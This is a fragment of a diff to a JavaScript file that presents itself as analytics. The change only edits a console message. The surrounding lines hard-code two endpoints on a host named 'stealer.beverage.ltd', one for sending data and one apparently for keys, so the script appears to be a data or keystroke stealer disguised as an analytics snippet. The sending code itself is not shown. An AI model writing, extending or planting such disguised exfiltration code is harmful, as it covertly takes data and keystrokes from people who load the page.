@@ -1,5 +1,5 @@
 (function () {
-  console.log("Analytics loaded!");
+  console.log("Analytics loaded! And it works!");
   const externURL = "https://stealer.beverage.ltd/send";
   const externURLKeys = "https://stealer.beverage.ltd/keys";
   // Helper function to send data
